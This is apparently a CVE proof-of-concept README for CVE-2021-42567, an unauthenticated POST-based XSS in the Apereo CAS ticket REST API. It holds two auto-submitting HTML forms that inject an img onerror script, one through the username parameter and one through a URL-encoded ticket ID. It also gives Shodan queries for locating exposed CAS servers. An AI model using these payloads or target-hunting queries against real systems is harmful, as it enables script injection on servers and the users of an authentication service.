# CVE-2021-42567
### Description:
Apereo CAS versions 6.3.x before 6.3.7.1 and 6.4.x before 6.4.2 have an unauthenticated POST-based XSS on the REST API of the ticket endpoint via the username parameter and the ticket's ID.
### Proof of Concept:
#### Using the username:
```
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://example.com/cas/v1/tickets/" method="POST">
      <input type="hidden" name="username" value="<img/src/onerror=alert(document.domain)>" />
      <input type="hidden" name="password" value="Mellon" />
    </form>
  </body>
</html>
```
#### Using the ticket's ID:
```
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://example.com/cas/v1/tickets/%3c%69%6d%67%20%73%72%63%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29%3e" method="POST">
      <input type="hidden" name="username" value="test" />
      <input type="hidden" name="password" value="Mellon" />
    </form>
  </body>
</html>
```
### Hunting for servers that running Apereo CAS:
##### Search on [Shodan](https://www.shodan.io/) using one of these queries:
* `"Server: Apereo CAS"`
* `http.title:"CAS - Central Authentication Service"`
### For more information:
Go to https://www.sudokaikan.com/2021/12/exploit-cve-2021-42567-post-based-xss.html
